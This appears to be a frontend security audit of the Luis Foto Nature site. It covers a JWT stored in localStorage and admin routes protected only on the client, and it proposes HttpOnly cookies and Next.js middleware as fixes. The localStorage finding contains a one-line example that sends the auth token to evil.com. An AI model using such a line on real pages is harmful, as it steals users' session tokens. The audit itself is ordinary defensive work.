# Security Audit — Luis Foto Nature (Frontend)

**Date:** 2026-02-19
**Scope:** Full client-side security review before production deployment with HTTPS

---

## Summary

| Severity | Count |
| -------- | ----- |
| Critical | 0     |
| High     | 2     |
| Medium   | 3     |
| Low      | 3     |

---

## HIGH Severity

### 2. JWT stored in `localStorage` (XSS-accessible)

**Files:**

- `app/context/AuthContext.tsx` (lines 27, 46, 54, 64)
- `app/utils/stp-api.tsx` (line 29)

**Issue:** The auth token is stored in `localStorage`, which is readable by any JavaScript running on the page. Combined with the XSS issue above, a single injected script can exfiltrate the token:

```js
fetch("https://evil.com?t=" + localStorage.getItem("token"));
```

**Fix (ideal):** Move token storage to an HTTP-only, Secure, SameSite cookie set by the backend. The frontend would no longer manage the token — the browser sends it automatically.

**Fix (minimum):** If localStorage must be used, resolving the XSS issue above is critical. Also set short token expiration with a refresh token flow.

---

## MEDIUM Severity

### 4. Admin route protection is client-side only

**File:** `app/admin/layout.tsx`

**Issue:** The admin guard runs entirely in the browser. There is no `middleware.ts` protecting `/admin` routes at the server level. This means:

- The admin page HTML/JS bundle is shipped to all users
- A brief flash of content can occur before the redirect
- A user could inspect the JavaScript to see admin UI code

**Fix:** Create `middleware.ts` at the project root:

```ts
import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

export function middleware(request: NextRequest) {
  const token = request.cookies.get("token")?.value;

  if (request.nextUrl.pathname.startsWith("/admin") && !token) {
    return NextResponse.redirect(new URL("/login", request.url));
  }

  return NextResponse.next();
}

export const config = {
  matcher: ["/admin/:path*"],
};
```

> Note: This requires the backend to set the token as a cookie (ties into fix #2).
